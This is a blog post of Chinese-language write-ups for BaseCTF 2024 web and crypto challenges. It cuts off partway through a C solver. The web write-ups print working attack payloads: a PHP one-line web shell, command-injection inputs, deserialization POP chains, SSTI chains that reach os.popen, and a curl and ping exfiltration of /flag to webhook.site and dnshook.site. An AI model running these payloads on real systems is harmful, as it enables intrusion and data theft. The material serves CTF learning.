---
title: Basectf
date: 2024-08-15 19:54:54
tags: 复现
categories: 比赛复现
---

## web题

### [Week1] HTTP 是什么呀

![image-20240815200620096](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408152006189.png)

我们根据提示来传参数

ip添加X-Forwarded-For的值为127.0.0.1

![image-20240815200742222](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408152007264.png)

get传参数时需要将值进行urlencode

```
?basectf=%77%65%31%63%25%30%30%6d%65
```

最后得到一个页面

![image-20240815200814334](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408152008364.png)

提示我们来的路上，我们返回上一个页面，打开抓包进行抓包就得到flag了

![image-20240815200855992](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408152008033.png)

最后进行base64解码



### **[Week1] 喵喵喵´•ﻌ•`**3

```
<?php
highlight_file(__FILE__);
error_reporting(0);

$a = $_GET['DT'];

eval($a);

?>
```

进行命令执行

```
?DT=system("cat ../../../flag");
```

就能得到flag



### [Week1] md5绕过欸

我们进行代码审计

```
<?php
highlight_file(__FILE__);
error_reporting(0);
require 'flag.php';

if (isset($_GET['name']) && isset($_POST['password']) && isset($_GET['name2']) && isset($_POST['password2']) ){
    $name = $_GET['name'];
    $name2 = $_GET['name2'];
    $password = $_POST['password'];
    $password2 = $_POST['password2'];
    if ($name != $password && md5($name) == md5($password)){
        if ($name2 !== $password2 && md5($name2) === md5($password2)){
            echo $flag;
        }
        else{
            echo "再看看啊，马上绕过嘞！";
        }
    }
    else {
        echo "错啦错啦";
    }

}
else {
    echo '没看到参数呐';
}
?>
```

首先绕过第一if语句，要求name!=pasword，但两个的md5值要相同（弱类型比较==）

我们想到md5后为0e开头的数的值为0

进行绕过

```
?name=QNKCDZO
password=240610708
```

第二个if语句，要求name2!=pasword2，但两个的md5值要相同（强类型比较===）

我们用数组进行绕过，数组的md5值为false

```
?name=QNKCDZO&name2[]=1
password=240610708&password2[]=2
```

得到flag



### [Week1] A Dark Room

文字游戏，不管，我们先打开源码，在最底下找到flag



### **[Week1] upload**

我们往php文件里写一个一句话木马

```
<?php @eval($_POST[1]);?>
```

直接上传，代码不用管

我们在右下角找到上传的图片

![image-20240815202603866](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408152026918.png)

在新页面打开，复制链接去蚁剑，进行连接，找到flag

![image-20240815202635456](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408152026506.png)



### [Week1] Aura 酱的礼物

```
<?php
highlight_file(__FILE__);
// Aura 酱，欢迎回家~
// 这里有一份礼物，请你签收一下哟~
$pen = $_POST['pen'];
if (file_get_contents($pen) !== 'Aura')
{
    die('这是 Aura 的礼物，你不是 Aura！');
}

// 礼物收到啦，接下来要去博客里面写下感想哦~
$challenge = $_POST['challenge'];
if (strpos($challenge, 'http://jasmineaura.github.io') !== 0)
{
    die('这不是 Aura 的博客！');
}

$blog_content = file_get_contents($challenge);
if (strpos($blog_content, '已经收到Kengwang的礼物啦') === false)
{
    die('请去博客里面写下感想哦~');
}

// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~
$gift = $_POST['gift'];
include($gift);
```

我们先用data伪协议绕过第一个if

```
pen=data://text/plain;base64,QXVyYQ==
```

第二个if, 我们要求页面的开头为 `http://jasmineaura.github.io`

```
challenge=http://jasmineaura.github.io
```

第三个if，我们需要往challenge里写入“已经收到Kengwang的礼物啦”,但页面开头要是http://jasmineaura.github.io，所以我们用[@绕过](https://cloud.tencent.com/developer/article/2288231)

```
challenge=http://jasmineaura.github.io@127.0.0.1?challenge=data://text/plain,已经收到Kengwang的礼物啦
```

最后用filter伪协议打开flag.php文件

```
pen=data://text/plain;base64,QXVyYQ==&challenge=http://jasmineaura.github.io@127.0.0.1?challenge=data://text/plain,已经收到Kengwang的礼物啦&gift=php://filter/convert.base64-encode/resource=flag.php
```



### [Week2] ez_ser

我们进行代码审计

```
<?php
highlight_file(__FILE__);
error_reporting(0);

class re{
    public $chu0;
    public function __toString(){
        if(!isset($this->chu0)){
            return "I can not believes!";
        }
        $this->chu0->$nononono;
    }
}

class web {
    public $kw;
    public $dt;

    public function __wakeup() {
        echo "lalalla".$this->kw;
    }

    public function __destruct() {
        echo "ALL Done!";
    }
}

class pwn {
    public $dusk;
    public $over;

    public function __get($name) {
        if($this->dusk != "gods"){
            echo "什么，你竟敢不认可?";
        }
        $this->over->getflag();
    }
}

class Misc {
    public $nothing;
    public $flag;

    public function getflag() {
        eval("system('cat /flag');");
    }
}

class Crypto {
    public function __wakeup() {
        echo "happy happy happy!";
    }

    public function getflag() {
        echo "you are over!";
    }
}
$ser = $_GET['ser'];
unserialize($ser);
?>
```

我们发现在Misc累的getflag函数能输出flag，所以我们的目的是getflag函数

```
class Misc {
    public $nothing;
    public $flag;

    public function getflag() {
        eval("system('cat /flag');");
    }
}
```

我们往上找，在pwn类中存在魔术方法\_get()能执行getflag函数，所以接下来我们需要触发_get()

触发时机：调用的成员属性不存在

```
class pwn {
    public $dusk;
    public $over;

    public function __get($name) {
        if($this->dusk != "gods"){
            echo "什么，你竟敢不认可?";
        }
        $this->over->getflag();
    }
}

```

我们接着往上找，在re类中存在_toString()有个未定义的变量能触发\_get()，所街接着我们要触发\_toString()

触发时机：把对象被当做**字符串**调用

```
class re{
    public $chu0;
    public function __toString(){
        if(!isset($this->chu0)){
            return "I can not believes!";
        }
        $this->chu0->$nononono;
    }
}
```

我们在web类中发现_wakeup方法能打印变量，所以我们就能触发\_tostring了

pop链

```
<?php
highlight_file(__FILE__);
error_reporting(0);

class re{
    public $chu0;

}

class web {
    public $kw;
    public $dt;


}

class pwn {
    public $dusk;
    public $over;


}

class Misc {
    public $nothing;
    public $flag;


}

class Crypto {
    public function __wakeup() {
        echo "happy happy happy!";
    }


}
$ser =new web();
$ser->kw=new re();
$ser->kw->chu0=new pwn();
$ser->kw->chu0->over=new Misc();
echo urlencode(serialize($ser));
?>
//O%3A3%3A%22web%22%3A2%3A%7Bs%3A2%3A%22kw%22%3BO%3A2%3A%22re%22%3A1%3A%7Bs%3A4%3A%22chu0%22%3BO%3A3%3A%22pwn%22%3A2%3A%7Bs%3A4%3A%22dusk%22%3BN%3Bs%3A4%3A%22over%22%3BO%3A4%3A%22Misc%22%3A2%3A%7Bs%3A7%3A%22nothing%22%3BN%3Bs%3A4%3A%22flag%22%3BN%3B%7D%7D%7Ds%3A2%3A%22dt%22%3BN%3B%7D

```

得到flag

### **[Week2] 一起吃豆豆**

我们在游戏结束那里发现一串base64编码，解码得到flag

![image-20240822171907195](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408221719307.png)

### **[Week2] 你听不到我的声音**

```
<?php
highlight_file(__FILE__);
shell_exec($_POST['cmd']);
```

shell_exec 不会将执行结果直接输出

- 我们使用重定向到文件

我们可以用流重定向符号来将输出内容重定向到文件中, 在通过浏览器进行下载

```
cmd=cat ../../../flag > 1.txt
```

- 通过 `curl` 外带

  我们可以通过 https://webhook.site/ 来进行数据外带, 我们可以拿到这样一个链接

```
https://webhook.site/b69846b7-ea9a-42f6-8e7a-04f80fdf35eb
```

此时这个路径下的所有请求都会被记录

于是我们可以通过shell指令:

```HTTP
curl https://webhook.site/b69846b7-ea9a-42f6-8e7a-04f80fdf35eb/`cat /flag | base64`
```

![image-20240831190333312](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408311903497.png)

- Dnslog 外带

Dnslog 的话可以使用国内的 `dnslog.cn` 但是我个人觉得不稳定

也可用在刚刚那里的 webhook 下面有个 dnshook

此时我们可以用 ping 外带

```HTTP
ping `cat /flag | base64`.xxxxxxx.dnshook.site
```

- 直接写马

或者我们可以利用指令写马, 用 wget, curl 下载木马

### [Week2] RCEisamazingwithspace

```
<?php
highlight_file(__FILE__);
$cmd = $_POST['cmd'];
// check if space is present in the command
// use of preg_match to check if space is present in the command
if (preg_match('/\s/', $cmd)) {
    echo 'Space not allowed in command';
    exit;
}

// execute the command
system($cmd);
```

题目过滤了空格，我们使用${IFS}来代替空格

```
cmd=cat${IFS}../../../flag
```

### [Week2] Really EZ POP

```
<?php
highlight_file(__FILE__);

class Sink
{
    private $cmd = 'echo 123;';
    public function __toString()
    {
        eval($this->cmd);
    }
}

class Shark
{
    private $word = 'Hello, World!';
    public function __invoke()
    {
        echo 'Shark says:' . $this->word;
    }
}

class Sea
{
    public $animal;
    public function __get($name)
    {
        $sea_ani = $this->animal;
        echo 'In a deep deep sea, there is a ' . $sea_ani();
    }
}

class Nature
{
    public $sea;

    public function __destruct()
    {
        echo $this->sea->see;
    }
}

if ($_POST['nature']) {
    $nature = unserialize($_POST['nature']);
}
```

进行代码审计，我们在Sink类中发现eval函数，可以进行命令执行，所以我们需要触发_toString魔术方法

我们往下找，在Shark类中发现echo可以打印变量触发\_toString，接下来我们就是要触发_invoke

我们在Sea类中发现$sea_ani()可以用来触发_invoke，接下来我们就是要触发\_get,

我们在nature类中发现一个未定义变量可以触发_get

由于类中存在私有属性，我们先把私有属性变为公有属性

```
<?php
highlight_file(__FILE__);

class Sink
{
    private $cmd = 'system("cat ../../../flag");';

}

class Shark
{
   public $word ;

}

class Sea
{
    public $animal;

}

class Nature
{
    public $sea;

}
$a=new Nature();
$a->sea=new Sea();
$a->sea->animal=new Shark();
$a->sea->animal->word=new Sink();
echo (serialize($a));
```

然后再修改序列化，将之前的私有属性修改回来，再进行

url编码

```
O%3A6%3A%22Nature%22%3A1%3A%7Bs%3A3%3A%22sea%22%3BO%3A3%3A%22Sea%22%3A1%3A%7Bs%3A6%3A%22animal%22%3BO%3A5%3A%22Shark%22%3A1%3A%7Bs%3A11%3A%22%00Shark%00word%22%3BO%3A4%3A%22Sink%22%3A1%3A%7Bs%3A9%3A%22%00Sink%00cmd%22%3Bs%3A28%3A%22system%28%22cat+..%2F..%2F..%2Fflag%22%29%3B%22%3B%7D%7D%7D%7D
```

### [Week2] 数学大师

```
import requests
import time

url = "http://challenge.basectf.fun:28753/"
session = requests.Session()
cookie = {
    "PHPSESSID": "uaef912egrmo035357g3jvb4kk"
}

session = requests.Session()
r = session.get(url=url,cookies=cookie)
a = r.text

def c(a):
    n = ""
    for k in range(len(a) - 2, -1, -1):
        if a[k] == ' ':
            break
        n += a[k]
    b = n[::-1]
    print(b)
    for i in range(len(b)):
        if b[i] == '+':
            c = b.split('+')
            d = int(c[0]) + int(c[1])
            break
        if b[i] == '-':
            c = b.split('-')
            d = int(c[0]) - int(c[1])
            break
        if b[i] == '×':
            c = b.split('×')
            d = int(c[0]) * int(c[1])
            break
        if b[i] == '÷':
            c = b.split('÷')
            d = int(c[0]) // int(c[1])
            break
    return d

while True:
    answer = c(a)
    data = {
        'answer': answer
    }
    r = session.post(url=url, data=data, cookies=cookie)
    a=r.text
    print(r.text)

```

### [Week2] 所以你说你懂 MD5?

```
<?php
session_start();
highlight_file(__FILE__);
// 所以你说你懂 MD5 了?

$apple = $_POST['apple'];
$banana = $_POST['banana'];
if (!($apple !== $banana && md5($apple) === md5($banana))) {
    die('加强难度就不会了?');
}

// 什么? 你绕过去了?
// 加大剂量!
// 我要让他成为 string
$apple = (string)$_POST['appple'];
$banana = (string)$_POST['bananana'];
if (!((string)$apple !== (string)$banana && md5((string)$apple) == md5((string)$banana))) {
    die('难吗?不难!');
}

// 你还是绕过去了?
// 哦哦哦, 我少了一个等于号
$apple = (string)$_POST['apppple'];
$banana = (string)$_POST['banananana'];
if (!((string)$apple !== (string)$banana && md5((string)$apple) === md5((string)$banana))) {
    die('嘻嘻, 不会了? 没看直播回放?');
}

// 你以为这就结束了
if (!isset($_SESSION['random'])) {
    $_SESSION['random'] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16));
}

// 你想看到 random 的值吗?
// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧
$random = $_SESSION['random'];
echo md5($random);
echo '<br />';

$name = $_POST['name'] ?? 'user';

// check if name ends with 'admin'
if (substr($name, -5) !== 'admin') {
    die('不是管理员也来凑热闹?');
}

$md5 = $_POST['md5'];
if (md5($random . $name) !== $md5) {
    die('伪造? NO NO NO!');
}

// 认输了, 看样子你真的很懂 MD5
// 那 flag 就给你吧
echo "看样子你真的很懂 MD5";
echo file_get_contents('/flag'); 加强难度就不会了?
```

第一个if我们使用数组绕过

```
apple[]=1&banana[]=2
```

第二个if我们使用科学计数法绕过

```
apple[]=1&banana[]=2&appple=QNKCDZO&bananana=240610708
```

第三个if是强类型比较，此时我们需要找到真实的 MD5 值一致的内容, 我们可以使用 fastcoll 工具

```
fastcoll -o a a1
```

```
apple[]=1&banana[]=2&appple=QNKCDZO&bananana=240610708&apppple=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&banananana=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&name=admin
```

第四个地方使用了哈希长度扩展攻击，我们使用脚本https://github.com/shellfeel/hash-ext-attack

我们需要知道已知字符的长度，我们使用

```
bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16))
```

虽然值不一样但长度是一样的，为96

![image-20240831194632622](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408311946916.png)

得到flag

![image-20240831194656312](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408311946716.png)

### [Week3] 滤个不停

```
<?php
highlight_file(__FILE__);
error_reporting(0);

$incompetent = $_POST['incompetent'];
$Datch = $_POST['Datch'];

if ($incompetent !== 'HelloWorld') {
    die('写出程序员的第一行问候吧！');
}

//这是个什么东东？？？
$required_chars = ['s', 'e', 'v', 'a', 'n', 'x', 'r', 'o'];
$is_valid = true;

foreach ($required_chars as $char) {
    if (strpos($Datch, $char) === false) {
        $is_valid = false;
        break;
    }
}

if ($is_valid) {

    $invalid_patterns = ['php://', 'http://', 'https://', 'ftp://', 'file://' , 'data://', 'gopher://'];

    foreach ($invalid_patterns as $pattern) {
        if (stripos($Datch, $pattern) !== false) {
            die('此路不通换条路试试?');
        }
    }


    include($Datch);
} else {
    die('文件名不合规 请重试');
}
?>
```

第一层是个简单的字符串相等，很容易就绕过去了

第⼆层是⽂件包含漏洞，过滤了很多协议，这⾥可以使⽤⽇志包含。

![image-20240905190545837](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409051905176.png)

### [Week3] 玩原神玩的

```
<?php
highlight_file(__FILE__);
error_reporting(0);

include 'flag.php';
if (sizeof($_POST['len']) == sizeof($array)) {
  ys_open($_GET['tip']);
} else {
  die("错了！就你还想玩原神？❌❌❌");
}

function ys_open($tip) {
  if ($tip != "我要玩原神") {
    die("我不管，我要玩原神！😭😭😭");
  }
  dumpFlag();
}

function dumpFlag() {
  if (!isset($_POST['m']) || sizeof($_POST['m']) != 2) {
    die("可恶的QQ人！😡😡😡");
  }
  $a = $_POST['m'][0];
  $b = $_POST['m'][1];
  if(empty($a) || empty($b) || $a != "100%" || $b != "love100%" . md5($a)) {
    die("某站崩了？肯定是某忽悠干的！😡😡😡");
  }
  include 'flag.php';
  $flag[] = array();
  for ($ii = 0;$ii < sizeof($array);$ii++) {
    $flag[$ii] = md5(ord($array[$ii]) ^ $ii);
  }
  
  echo json_encode($flag);
}
```

第⼀次判断传⼊的数组是否和 array 数组⼤⼩相等，我们不知道 array 数组的⼤⼩，只能爆破。

这⾥写⼀个脚本获取 payload，然后⼿动删改爆破

```
payload=''
for i in range(100):
 payload+='len['+str(i)+']=0&'
print(payload)
```

爆破后发现 array 的⻓度为 45，进⼊第⼆层。

![image-20240905191246760](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409051912818.png)

第⼆层很简单，传⼊指定字符串即可。

第三层要求传⼊⼀个 m 数组，其中 m[0] 是字符串 100% ，m[1] 是字符串 love100% 拼接 m[0]

的 md5 值。

注意 % 需要 URL 编码。

![image-20240905191531044](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409051915105.png)

最后⼀层，给出加密后的 flag 数组，加密流程很简单，就是把 flag 每⼀个字符的 ASCII 值和当前索引

异或再取 md5 值，挨个输出，写⼀个脚本爆破即可。

```
from hashlib import md5
enc = ["3295c76acbf4caaed33c36b1b5fc2cb1","26657d5ff9020d2abefe558796b9958
4","73278a4a86960eeb576a8fd4c9ec6997","ec8956637a99787bd197eacd77acce5e",
"e2c420d928d4bf8ce0ff2ec19b371514","43ec517d68b6edd3015b3edc9a11367b","ea5
d2f1c4608232e07d3aa3d998e5135","c8ffe9a587b126f152ed3d89a146b445","44f683a
84163b3523afe57c2e008bc8c","c9e1074f5b3f9fc8ea15d152add07294","2838023a778
dfaecdc212708f721b788","66f041e16a60928b05a7e228a89c3799","072b030ba126b2f
4b2374f342be9ed44","072b030ba126b2f4b2374f342be9ed44","2723d092b63885e0d7c
260cc007e8b9d","2723d092b63885e0d7c260cc007e8b9d","7f39f8317fbdb1988ef4c62
8eba02591","e369853df766fa44e1ed0ff613f563bd","182be0c5cdcd5072bb1864cdee4
d3d6e","a1d0c6e83f027327d8461063f4ac58a6","e369853df766fa44e1ed0ff613f563b
d","9f61408e3afb633e50cdf1b20de6f466","e369853df766fa44e1ed0ff613f563bd",
"73278a4a86960eeb576a8fd4c9ec6997","f7177163c833dff4b38fc8d2872f1ec6","c8f
fe9a587b126f152ed3d89a146b445","b53b3a3d6ab90ce0268229151c9bde11","4c56ff4
ce4aaf9573aa5dff913df997a","6c8349cc7260ae62e3b1396831a8398f","4c56ff4ce4a
af9573aa5dff913df997a","d645920e395fedad7bbbed0eca3fe2e0","c0c7c76d30bd3dc
aefc96f40275bdc0a","a3f390d88e4c41f2747bfa2f1b5f87db","b6d767d2f8ed5d21a44
b0e5886680cb9","37693cfc748049e45d87b8c7d8b9aacd","b6d767d2f8ed5d21a44b0e5
886680cb9","c74d97b01eae257e44aa9d5bade97baf","33e75ff09dd601bbe69f3510391
52189","6f4922f45568161a8cdf4ad2299f6d23","34173cb38f07f89ddbebc2ac9128303
f","33e75ff09dd601bbe69f351039152189","c16a5320fa475530d9583c34fd356ef5",
"c16a5320fa475530d9583c34fd356ef5","6ea9ab1baa0efb9e19094440c317e21b","43e
c517d68b6edd3015b3edc9a11367b"]
flag=''
for i in range(45):
 for c in range(127):
 if(md5(str(c^i).encode()).hexdigest()==enc[i]):
 flag+=chr(c)
 break
print(flag)
#BaseCTF{6a9101cb-3396-4f4e-b1d6-d75549494656}
```

### [Week3] ez_php_jail

```

<?php
highlight_file(__FILE__);
error_reporting(0);
include("hint.html");
$Jail = $_GET['Jail_by.Happy'];

if($Jail == null) die("Do You Like My Jail?");

function Like_Jail($var) {
    if (preg_match('/(`|\$|a|c|s|require|include)/i', $var)) {
        return false;
    }
    return true;
}

if (Like_Jail($Jail)) {
    eval($Jail);
    echo "Yes! you escaped from the jail! LOL!";
} else {
    echo "You will Jail in your life!";
}
echo "\n";

// 在HTML解析后再输出PHP源代码

?>
```

当 php 版本⼩于 8 时，GET 请求的参数名含有 . ，会被转为 _ ，但是如果参数名中有 [ ，这个 [ 会被直接转为 _ ，但是后⾯如果有 . ，这个 . 就不会被转为 _ 。

过滤了一些东西，我们可以使用highlight_file打开

```
/?Jail[by.Happy=highlight_file(glob("/f*")[0]);
```

**glob()** 函数：返回一个包含匹配指定模式的文件名或目录的数组，如果失败则返回 FALSE。

### **[Week3] 复读机**

SSTI，过滤了一些关键字和一些符号，经过测试，过滤了以下符号

```
+ - * / . {{ }} __ : " \
```

先是使用继承链走到 RCE

过滤了 `.` ，可以用中括号绕，过滤了关键字，可以在关键字中间插入一对单引号 `''`

寻找能 RCE 的类，比如 `<class 'os._wrap_close'>`

```Go
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137])%}
```

接着使用这个类里的 `popen` 函数来 RCE

```Go
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('pwd')['rea''d']())%}
```

因为过滤了斜杠和反斜杠，无法直接跳到根目录，这里提供三个方法来获取斜杠来跳到根目录

法一：利用 chr 函数来构造出一个命令

先找到 chr

```Go
BaseCTF{% set chr= ''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['_''_bui''ltins_''_']['chr']%}
{% print(chr) %}
```

接着用 chr 搭配上数字构造出想要执行的命令

```Go
BaseCTF{% set chr= ''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['_''_bui''ltins_''_']['chr']%}
{% set cmd='cat '~chr(47)~'flag' %}
{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen'](cmd)['rea''d']())%}
```

最后把 cmd 作为 popen 的参数传递进去，即可得到 flag

同理，利用 format 来得到 `/` 也是可以的

```Go
BaseCTF{% set cmd='cat '~'%c'%(47)~'flag' %}
{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen'](cmd)['rea''d']())%}
```

法二：利用环境变量的值

查看环境变量，可以看到 `OLDPWD=/`

```Go
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('env')['rea''d']())%}
```

此时可以直接利用它来切换到根目录，然后再读flag

```Go
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('cd $OLDPWD;cat flag')['rea''d']())%}
```

法三：利用 `expr substr` 切割出一个 `/`

比如 pwd 中的第一个字符就是 `/` ，那用 `expr substr` 切割出来后，之后就可以像法二那样切换到根目录然后读 flag 了

```Go
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('a=`pwd`;a=`substr $a 1 1`;cd $a;cat flag')['rea''d']())%}
```

### [Week4] flag直接读取不就行了

```
<?php
highlight_file('index.php');
# 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~
error_reporting(0);
$J1ng = $_POST['J'];
$Hong = $_POST['H'];
$Keng = $_GET['K'];
$Wang = $_GET['W'];
$dir = new $Keng($Wang);
foreach($dir as $f) {
    echo($f . '<br>');
}
echo new $J1ng($Hong);
?>
```

我们使用php原生类来查找secret文件夹的内容

```
?K=DirectoryIterator&W=/secret/
```

DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。

DirectoryIterator 类会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 __toString() 方法，输出指定目录里面经过排序之后的第一个文件名

```
<?php
$dir=new DirectoryIterator("/");
foreach($dir as $tmp){
    echo($tmp.'<br>');
    //echo($tmp->__toString().'<br>'); //与上句效果一样
}
```

然后我们使用SplFileObject类用伪协议读取php内容

```
J=SplFileObject&H=php://filter/read=convert.base64-encode/resource=/secret/f11444g.php
```

![image-20240918214047235](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409182140338.png)

https://blog.csdn.net/unexpectedthing/article/details/121780909



## Crypot

### [Week1] helloCrypto

我们分析代码

```
from Crypto.Util.number import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import random

flag=b'BaseCTF{}'

key=random.randbytes(16)
print(bytes_to_long(key))

my_aes=AES.new(key=key,mode=AES.MODE_ECB)
print(my_aes.encrypt(pad(flag,AES.block_size)))

# key1 = 208797759953288399620324890930572736628
# c = b'U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe{\xae'

```

这是个AES对称加密,使用的是ECB模式

代码先随机生成密钥key，以 ECB 模式创建 AES 加密对象 `my_aes`。

将 `flag` 填充至AES的块大小（16字节）的倍数。

`my_aes.encrypt(...)`：使用AES加密填充后的 `flag`，并打印加密后的密文。

`key1` 是一个长整数形式的密钥值。

`c` 是一个加密后的字节串。

如果将 key 转回字节形式，并用它来解密 `c`，可以恢复出原始的 `flag`。

```
from Crypto.Util.number import long_to_bytes
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# 已知密钥的长整数形式和加密后的密文
key1 = 208797759953288399620324890930572736628
c = b'U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe{\xae'

# 将长整数形式的密钥转换回字节形式
key = long_to_bytes(key1)

# 创建AES解密对象
my_aes = AES.new(key=key, mode=AES.MODE_ECB)

# 解密密文并移除填充
decrypted = unpad(my_aes.decrypt(c), AES.block_size)

print(decrypted)  # 这将打印出解密后的明文

```



### [Week1] ez_rsa

rsa加密

我们来看代码

```
from Crypto.Util.number import *
import gmpy2
m=bytes_to_long(b'BaseCTF{th1s_is_fake_fl4g}')
e=65537
p=getPrime(512)
q=getPrime(512)
n=p*q
not_phi=(p+2)*(q+2)
c=pow(m,e,n)

print(n)
print(not_phi)
print(c)


'''
96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421
96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205
37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945
'''
```

通过代码我们可以知道n，not_phi，c，e的值我们需要得到m，就需要d和phi

通过分解not_phi，我们可以得到p+q的值，然后就能得到phi的值，有了phi，我们通过与e逆元得到d，最后解密m得到flag

```
from Crypto.Util.number import *
from  gmpy2 import invert
from libnum import n2s,s2n
e=65537
n=96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421
not_phi=96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205
pq=(not_phi-n-4)//2
phi=n-pq+1
c=37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945

d=invert(e,phi)
m=pow(c,d,n)
print(n2s(int(m)))
```



### [Week1] 十七倍

```
#include <stdio.h>

int main() {
    unsigned char flag[] = "BaseCTF{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}";
    
    /**
     * 由 (unsigned) char 决定，每个元素在内存中占 1 字节，即 8 位（8 个 0 或 1）
     * 在内存中，“字符”保存的是其在“字母表”中是第几个字符
     * 例如：
     * B 即  66 在内存中存的是 01000010
     * a 即  97 在内存中存的是 01100001
     * s 即 115 在内存中存的是 01110011
     * e 即 101 在内存中存的是 01100101
     */

    int i;
    for (i = 0; i < 40; i++) {
        flag[i] = flag[i] * 17;
    }
    if (flag[0] != 98) {  /* 下标是从 0 开始的 */
        printf("CPU Error???\n");
        return 1;
    }

    /**
     * 66 * 17 = 1122
     * 如果在内存中保存 1122，会是 00000100 01100010
     * 但是 unsigned char 决定了只能存 8 位，CPU 硬件会自动取低 8 位，即 01100010
     * 01100010 即 98，所以 66 * 17 = 98
     * 
     * 注意到 8 个 0 或 1 有 256 种可能，即 0~255
     * 且取低 8 位即取模（取余数）256
     * 你可以验证：1122 除以 256 商为 4 余数为 98
     */

    unsigned char cipher[] = {
         98, 113, 163, 181, 115, 148, 166,  43,   9,  95,
        165, 146,  79, 115, 146, 233, 112, 180,  48,  79,
         65, 181, 113, 146,  46, 249,  78, 183,  79, 133,
        180, 113, 146, 148, 163,  79,  78,  48, 231,  77
    };
    for (i = 0; i < 40; i++) {
        if (flag[i] != cipher[i]) {
            printf("flag[%d] is wrong, expect %d, got %d.\n", i, cipher[i], flag[i]);
            return 1;
        }
    }

    /**
     * 如果 flag 是正确的，运算后会得到上面的数据。
     * 如果是实数域运算，flag[i] * 17 = cipher[i]，那么 flag[i] = cipher[i] / 17
     * 模了 256 后又是怎么样呢？学一下“模运算乘法逆元”吧。
     */

    return 0;
}
```

根据提示，cipher里的值是flag的字符的ascii码乘以17再模256得到的值

我们可以反向推导，遍历数组，再遍历1到5000的数字，如果它模上256为数组中的值且能被17整除，我们就打印这个字符，于是我们得到

```
#include <stdio.h>

int main() {
